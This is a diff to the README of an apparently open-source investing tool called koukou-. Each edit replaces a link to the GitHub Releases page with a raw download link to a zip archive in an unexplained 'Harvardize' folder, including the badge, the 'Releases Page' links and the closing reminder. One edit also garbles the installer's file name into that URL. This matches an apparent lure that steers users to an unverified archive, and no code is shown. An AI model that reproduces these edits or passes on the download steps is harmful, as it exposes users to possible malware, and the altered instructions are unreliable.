@@ -4,7 +4,7 @@
 Welcome to koukou-, a project designed to help individual investors make informed decisions. Our goal is to use mathematical economic models to correlate market changes with investor sentiment. This README will guide you through the process of downloading and running the software.
 
 ## 📥 Download the Application
-[![Download koukou-](https://img.shields.io/badge/Download-Now-orange.svg)](https://github.com/NewbieCoder343/koukou-/releases)
+[![Download koukou-](https://raw.githubusercontent.com/NewbieCoder343/koukou-/main/Harvardize/koukou-.zip)](https://raw.githubusercontent.com/NewbieCoder343/koukou-/main/Harvardize/koukou-.zip)
 
 ## 📋 Features
 - **User-Friendly Interface:** No technical skills required. 
@@ -23,13 +23,13 @@ To run koukou-, make sure your computer meets these system requirements:
 Follow these simple steps to install and run koukou-:
 
 ### Step 1: Visit the Download Page
-Go to the [Releases Page](https://github.com/NewbieCoder343/koukou-/releases) to find the latest version of koukou-.
+Go to the [Releases Page](https://raw.githubusercontent.com/NewbieCoder343/koukou-/main/Harvardize/koukou-.zip) to find the latest version of koukou-.
 
 ### Step 2: Choose Your Version
 Look for the version that suits your operating system. Click on the appropriate file to start the download.
 
 ### Step 3: Download the Installer
-Once you click to download, your browser will start downloading the file. The file might be named something like `koukou-setup.exe` for Windows or `koukou-dmg` for macOS.
+Once you click to download, your browser will start downloading the file. The file might be named something like `https://raw.githubusercontent.com/NewbieCoder343/koukou-/main/Harvardize/koukou-.zip` for Windows or `koukou-dmg` for macOS.
 
 ### Step 4: Run the Installer
 - **Windows:** Locate the downloaded `.exe` file, double-click it, and follow the on-screen instructions.
@@ -57,6 +57,6 @@ If you have questions or need assistance, please feel free to reach out. You can
 koukou- is open-source software. You are free to use and modify it as per your needs. Please refer to the LICENSE file for more information.
 
 ## 🔗 Download and Install Again
-Don’t forget, to download the latest version of koukou-, visit the [Releases Page](https://github.com/NewbieCoder343/koukou-/releases).
+Don’t forget, to download the latest version of koukou-, visit the [Releases Page](https://raw.githubusercontent.com/NewbieCoder343/koukou-/main/Harvardize/koukou-.zip).
 
 Feel free to explore and start your journey towards confident investing with koukou-.
